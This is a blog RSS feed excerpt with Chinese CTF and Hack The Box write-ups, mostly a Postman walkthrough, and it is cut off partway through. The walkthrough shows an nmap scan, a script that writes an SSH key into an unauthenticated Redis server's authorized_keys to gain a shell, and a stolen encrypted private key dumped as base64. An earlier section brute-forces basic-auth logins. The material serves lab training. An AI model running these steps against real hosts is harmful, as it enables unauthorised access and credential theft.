		&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print(l[0])
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encodestr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodestr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;​	将结果放进爆破模块的 payload 中，进行爆破，解码得到密码&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzf1hs6j316d0u0tvd.jpg&quot; alt=&quot;06&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzi7urvj312y0u0wp6.jpg&quot; alt=&quot;07&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;输入用户名密码获取flag&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 01 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/01/CTFHUB-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/01/CTFHUB-%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/</guid>
        
        <category>CTFHUB</category>
        
        <category>writeup</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Traverxec writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/HTB-Traverxec/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Traverxec/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Postman writeup/Walkthrough/攻略</title>
        <description>&lt;h2 id=&quot;0x00-简介&quot;&gt;0x00 简介&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;nmap 指令&lt;/li&gt;
  &lt;li&gt;Redis 未授权访问&lt;/li&gt;
  &lt;li&gt;Webmin CVE Package Updates&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01-信息收集&quot;&gt;0x01 信息收集&lt;/h2&gt;

&lt;p&gt;nmap 对某一站点全面扫描 (&lt;strong&gt;SYN全端口扫描&lt;/strong&gt;) 常用指令如下：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.160
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;-sS:&lt;/strong&gt;  SYN扫描是目前默认的也是最受欢迎的扫描选项&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-sV:&lt;/strong&gt; 版本探测，也可以用 -A 同时打开操作系统探测和版本探测。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-sC:&lt;/strong&gt; 使用默认脚本进行扫描&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-T4:&lt;/strong&gt; 指定扫描过程中使用的时序(Timing)，共有6个级别(0-5)，级别越高，扫描速度越快，但也越容易被防火墙屏蔽。在网络通信状态良好的情况下推荐使用 T4.&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-v:&lt;/strong&gt; 显示冗余信息，在扫描过程中显示扫描的细节&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-p-:&lt;/strong&gt; 表示从端口1扫描到65535&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Other:&lt;/strong&gt; 扫描的时候按 &lt;code class=&quot;highlighter-rouge&quot;&gt;d&lt;/code&gt; 可以显示 debug 信息，按 &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; 可以显示当前进度&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.160
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-01-02 21:56 CST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Postman &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.160&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 49025 closed ports, 16506 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-title: The Cyber Geek&lt;span class=&quot;s1&quot;&gt;'s Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。&lt;/p&gt;

&lt;h2 id=&quot;0x02-redis-未授权访问漏洞利用&quot;&gt;0x02 Redis 未授权访问漏洞利用&lt;/h2&gt;

&lt;p&gt;发现 6379 端口运行着 Redis 服务，且版本较低，存在未授权访问漏洞，可以将本地 ssh 公钥写进远程靶机从而  getshell&lt;/p&gt;

&lt;p&gt;exploit 如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shll&quot;&gt;#!/bin/bash
rm /root/.ssh/id*
ssh-keygen -t rsa

(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &amp;gt; foo.txt

redis-cli -h 10.10.10.160 flushall
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;
redis-cli -h 10.10.10.160 save

ssh -i /root/.ssh/id_rsa redis@10.10.10.160
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;具体说明：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; 为了避免和Redis里其他缓存数据混合&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;redis-cli &lt;code class=&quot;highlighter-rouge&quot;&gt;-x&lt;/code&gt; 参数：代表从标准输入读取数据作为该命令的最后一个参数。&lt;/p&gt;

    &lt;p&gt;例：&lt;code class=&quot;highlighter-rouge&quot;&gt;$echo &quot;world&quot; |redis-cli -x set hello&lt;/code&gt; 等价于 &lt;code class=&quot;highlighter-rouge&quot;&gt;redis-cli set hello world&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;该版本的 Redis 允许任意用户未授权访问并写文件，同时 Redis 在其默认目录下拥有 ssh 密钥并对其有写权限。这导致攻击者可以用自己的公钥覆盖原文件，实现远程登录。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; 文件夹，并将 &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; 覆盖&lt;/p&gt;

    &lt;p&gt;这样就可以成功的将自己的公钥写入 /.ssh 文件夹的 authotrized_keys 文件里，然后攻击者就可以直接用 ssh 免密登录&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;flushall&lt;/code&gt; 删除所有数据库中的所有key&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;&lt;a href=&quot;https://www.00theway.org/2017/03/27/redis_exp/&quot;&gt;redis未授权访问利用&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/#写入SSH公钥直接连接&quot;&gt;Redis未授权访问漏洞利用&lt;/a&gt;&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在试图 &lt;code class=&quot;highlighter-rouge&quot;&gt;set key&lt;/code&gt; 时，可能会爆出错误 &lt;code class=&quot;highlighter-rouge&quot;&gt;(error) READONLY You can't write against a read only slave.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;SLAVEOF no one&lt;/code&gt; 使其变回主服务器。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/5616#toc-3&quot;&gt;SLAVEOF&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/58d4e31aa22b9d00645634fc&quot;&gt;Redis 主从复制常见问题&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
(error) READONLY You can't write against a read only slave.
10.10.10.160:6379&amp;gt; SLAVEOF no one
OK
10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
OK
(0.95s)
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x03-usertxt&quot;&gt;0x03 User.txt&lt;/h2&gt;

&lt;p&gt;拿到 redis 的低权限 shell 后，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; 目录下发现用户 Matt，&lt;code class=&quot;highlighter-rouge&quot;&gt;su Mutt&lt;/code&gt; 尝试切换发现需要密码。在 &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; 文件中发现存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa_bak&lt;/code&gt;，因此遍历各个关键目录查找线索，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/opt&lt;/code&gt; 下发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;ida_rsa.bak&lt;/code&gt; 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg&quot; alt=&quot;Xnip2020-01-05_22-44-39&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d&lt;/code&gt; 将文件拷贝到本地 kali，命名为 Mattssh_bak&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;redis@Postman:/var&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt
redis@Postman:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;id_rsa.bak
redis@Postman:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64 &lt;/span&gt;id_rsa.bak 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH
c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq
cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly
cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN
R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ
dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz
d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC
VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw
Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p
OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds
cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv
TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0
S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL
ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw
M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4
VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm
M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6
VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK
M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW
cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj
eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3
TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS
VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK
MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~/Desktop/ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01